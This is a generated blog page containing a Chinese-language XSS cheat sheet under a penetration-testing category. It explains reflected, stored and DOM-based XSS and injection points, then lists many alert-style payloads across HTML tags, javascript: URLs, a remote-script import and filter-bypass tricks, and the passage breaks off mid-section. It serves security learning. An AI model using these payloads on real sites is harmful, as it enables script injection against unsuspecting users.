+        volantis.scroll.unengine.start();
+      }
+      volantis.requestAnimationFrame(loop)
+    }
+    volantis.requestAnimationFrame(loop)
+  }
+  volantis.scroll.handleScrollEvents()
+  volantis.scroll.ele = null;
+  // 触发页面滚动至目标元素位置
+  volantis.scroll.to = (ele, option = {}) => {
+    if (!ele) return;
+    volantis.scroll.ele = ele;
+    // 默认配置
+    opt = {
+      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
+      behavior: "smooth"
+    }
+    // 定义配置
+    if ("top" in option) {
+      opt.top = option.top
+    }
+    if ("behavior" in option) {
+      opt.behavior = option.behavior
+    }
+    if ("addTop" in option) {
+      opt.top += option.addTop
+    }
+    if (!("observerDic" in option)) {
+      option.observerDic = 100
+    }
+    // 滚动
+    window.scrollTo(opt);
+    // 监视器
+    // 监视并矫正元素滚动到指定位置
+    // 用于处理 lazyload 引起的 cls 导致的定位失败问题
+    // option.observer = false
+    if (option.observer) {
+      setTimeout(() => {
+        if (volantis.scroll.ele != ele) {
+          return
+        }
+        volantis.scroll.unengine.push(() => {
+          let me = ele.getBoundingClientRect().top
+          if(!(me >= -option.observerDic && me <= option.observerDic)){
+            volantis.scroll.to(ele, option)
+          }
+          volantis.scroll.unengine.remove("unengineObserver")
+        },"unengineObserver")
+      },1000)
+    }
+  }
+  /********************** Content Visibility ********************************/
+  // 见 source/css/first.styl 如果遇到任何问题 删除 .post-story 即可
+  // 一个元素被声明 content-visibility 属性后 如果元素不在 viewport 中 浏览器不会计算其后代元素样式和属性 从而节省 Style & Layout 耗时
+  // content-visibility 的副作用: 锚点失效 等等(实验初期 暂不明确), 使用此方法清除样式
+  volantis.cleanContentVisibility = ()=>{
+    if (document.querySelector(".post-story")) {
+      console.log("cleanContentVisibility");
+      document.querySelectorAll(".post-story").forEach(e=>{
+        e.classList.remove("post-story")
+      })
+    }
+  }
+  /******************************************************************************/
+  /******************************************************************************/
+  /******************************************************************************/
+  //图像加载出错时的处理
+  function errorImgAvatar(img) {
+    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg";
+    img.onerror = null;
+  }
+  function errorImgCover(img) {
+    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg";
+    img.onerror = null;
+  }
+  /******************************************************************************/
+</script>
+
+  <!-- import head_end begin -->
+  <!-- import head_end end -->
+  <!-- Custom Files headEnd begin-->
+  
+  <!-- Custom Files headEnd end-->
+  <!-- front-matter head_end begin -->
+  <!-- front-matter head_end end -->
+</head>
+  <body itemscope itemtype="http://schema.org/WebPage">
+    <!-- import body_begin begin-->
+    <!-- import body_begin end-->
+    <!-- Custom Files bodyBegin begin-->
+    
+    <!-- Custom Files bodyBegin end-->
+    <!-- front-matter body_begin begin -->
+    <!-- front-matter body_begin end -->
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
+        
+          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+            <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/" title="博客"
+                  
+                  
+                  
+                    active-action="action-home"
+                  >
+                  <i class='fa-solid fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/" title="分类"
+                  
+                  
+                  
+                    active-action="action-categories"
+                  >
+                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/tags/" title="标签"
+                  
+                  
+                  
+                    active-action="action-tags"
+                  >
+                  <i class='fa-solid fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/archives/" title="归档"
+                  
+                  
+                  
+                    active-action="action-archives"
+                  >
+                  <i class='fa-solid fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/friends/" title="友链"
+                  
+                  
+                  
+                    active-action="action-friends"
+                  >
+                  <i class='fa-solid fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/about/" title="关于"
+                  
+                  
+                  
+                    active-action="action-about"
+                  >
+                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+      
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fa-solid fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+      
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" href="/" onclick="return false;" title="search"></a></li>
+				
+				<li>
+          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" href="/" onclick="return false;" title="menu"></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/" title="博客"
+                  
+                  
+                  
+                    active-action="action-home"
+                  >
+                  <i class='fa-solid fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/" title="分类"
+                  
+                  
+                  
+                    active-action="action-categories"
+                  >
+                  <i class='fa-solid fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/tags/" title="标签"
+                  
+                  
+                  
+                    active-action="action-tags"
+                  >
+                  <i class='fa-solid fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/archives/" title="归档"
+                  
+                  
+                  
+                    active-action="action-archives"
+                  >
+                  <i class='fa-solid fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/friends/" title="友链"
+                  
+                  
+                  
+                    active-action="action-friends"
+                  >
+                  <i class='fa-solid fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/about/" title="关于"
+                  
+                  
+                  
+                    active-action="action-about"
+                  >
+                  <i class='fa-solid fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+
+      <!-- Custom Files header begin -->
+      
+      <!-- Custom Files header end -->
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+      <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
+      <div id="none" class='cover-wrapper post search' style="display: none;">
+        
+  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/background.png"></div>
+
+<div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">My Blog</p>
+    
+    
+      <p class="subtitle">blog</p>
+    
+  </div>
+  <div class='bottom'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="搜索" />
+          <i class="icon fa-solid fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              active-action="action-home">
+              <p>博客</p>
+            </a>
+          
+            <a href="/categories/"
+              
+              
+              active-action="action-categories">
+              <p>分类</p>
+            </a>
+          
+            <a href="/tags/"
+              
+              
+              active-action="action-tags">
+              <p>标签</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              active-action="action-archives">
+              <p>归档</p>
+            </a>
+          
+            <a href="/friends/"
+              
+              
+              active-action="action-friends">
+              <p>友链</p>
+            </a>
+          
+            <a href="/about/"
+              
+              
+              active-action="action-about">
+              <p>关于</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+      </div>
+    
+  
+</div>
+
+      <div id="safearea">
+        <div class="body-wrapper">
+          
+<div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/28/xss总结/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="blog">
+  </span>
+  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
+    <meta itemprop="name" content="blog">
+    <meta itemprop="description" content="this is my blog">
+  </span>
+  
+
+
+  
+    <span hidden>
+      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+    </span>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title" itemprop="name headline">
+        xss总结
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url"><span itemprop="name">渗透测试</span></a>
+      </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-07-28T19:06:08+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jul 28, 2024</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>反射型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">不会存在数据库里面，一般出现在查询页面  反射型XSS，又称非持久型XSS，攻击相对于受害者而言是一次性的  具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本</span><br></pre></td></tr></table></figure>
+
+<p>存储型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">存在数据库里面，一般出现在注册页、留言板等  存储型XSS是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库  当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码持续攻击用户。 存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来</span><br></pre></td></tr></table></figure>
+
+<p>DOM型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。 </span><br><span class="line">不与后台服务器交互数据  也属于反射型的一种  一种通过dom操作前端输出的时候产生问题  DOM，全称Document Object Model，是一个平台和语言都中立的接口  可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式  DOM-XSS简单理解就是不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>url、留言板处、搜索框、个人资料等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. HTTP Header：某些HTTP头部（如User-Agent、Referer等）中可能存在XSS漏洞。</span><br><span class="line">2. URL参数：除了GET请求之外，还有其他一些请求类型（如PUT、DELETE等）也可以通过URL参数传递数据，这些参数也可能存在XSS漏洞。</span><br><span class="line">3. HTML标签属性：在HTML标签中，像&lt;img&gt;、&lt;script&gt;等标签的属性中可能存在XSS漏洞，例如&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;。</span><br><span class="line">4. HTML事件属性：在HTML标签中，像&lt;button&gt;、&lt;input&gt;等标签的事件属性中可能存在XSS漏洞，例如&lt;button onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/button&gt;。</span><br><span class="line">5. JavaScript代码中：在JavaScript代码中，例如eval()函数等，可能存在XSS漏洞，例如eval(&quot;alert(&#x27;XSS&#x27;)&quot;)。</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><p>1.先试试有没有过滤能否进行xss注入,如果在搜索框中可以<code>&lt;h1&gt;1&lt;h1&gt;</code>试探搜出的<code>1</code>是否符合<code>&lt;h1&gt;</code>标签如果符合则存在xss注入。</p>
+<p>2.所有能输入的地方都要输入一遍。</p>
+<p>3.当遇到过滤时试着绕过。</p>
+<p>4.能上传文件的地方可以上传包含xss的文件。</p>
+<h2 id="常用的注入语句"><a href="#常用的注入语句" class="headerlink" title="常用的注入语句"></a>常用的注入语句</h2><p><code>&lt;script&gt;</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;img&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;input&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;details&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;svg&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;select&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;iframe&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;video&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;audio&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;body&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;textarea&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;keygen&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;marquee&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;isindex&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure>
+
+<p>利用link远程包含js文件</p>
+<p><strong>PS：在无CSP的情况下才可以</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>javascript伪协议</p>
+<p><code>&lt;a&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;iframe&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;img&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//IE7以下</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;form&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其它</p>
+<p>expression属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt;</span> // IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;<span class="attribute">x</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> // IE7以下</span><br></pre></td></tr></table></figure>
+
+<p>background属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>
+
+<h2 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h2><h3 id="某些特殊字符绕过"><a href="#某些特殊字符绕过" class="headerlink" title="某些特殊字符绕过"></a>某些特殊字符绕过</h3><h4 id="（空格绕过）"><a href="#（空格绕过）" class="headerlink" title="&#96;&#96;（空格绕过）"></a>&#96;&#96;（空格绕过）</h4><p>空格使用由<code>/</code>来进行替代，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x/onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="括号绕过"><a href="#括号绕过" class="headerlink" title="()括号绕过"></a><code>()</code>括号绕过</h4><p>空格有&#96;来进行代替，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改为：</p>
